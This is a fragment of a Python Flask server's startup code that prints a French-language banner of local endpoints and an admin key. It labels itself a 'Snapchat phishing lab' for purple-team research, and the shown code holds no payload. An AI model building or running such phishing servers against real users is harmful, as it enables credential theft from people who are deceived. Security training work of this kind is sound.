║   Interdit Toute utilisation non autorisee                      ║
╠══════════════════════════════════════════════════════════════════╣
║   Page d'accueil           https://localhost:5000               ║
║   Statistiques             https://localhost:5000/api/report    ║
║   API consentement         https://localhost:5000/api/consent   ║
║   Export anonymise         https://localhost:5000/export        ║
║   Reset base               https://localhost:5000/reset         ║
║   DB check                 https://localhost:5000/api/dbcheck   ║
║   Admin Key                """ + CONFIG["ADMIN_KEY"][:42] + """              ║
╠══════════════════════════════════════════════════════════════════╣
║  Demarrer :    python main.py                                   ║
╚══════════════════════════════════════════════════════════════════╝
        """)
    except UnicodeEncodeError:
        print("SNAPCHAT PHISHING LAB - PURPLE TEAM - Research Ethique")
        proto = "https" if CONFIG["USE_HTTPS"] else "http"
        print(f"Server: {proto}://localhost:{CONFIG['SERVER_PORT']}")
        print(f"Admin Key: {CONFIG['ADMIN_KEY']}")

    app.run(host='0.0.0.0', port=CONFIG["SERVER_PORT"], 
            ssl_context='adhoc' if CONFIG["USE_HTTPS"] else None,
            threaded=True)
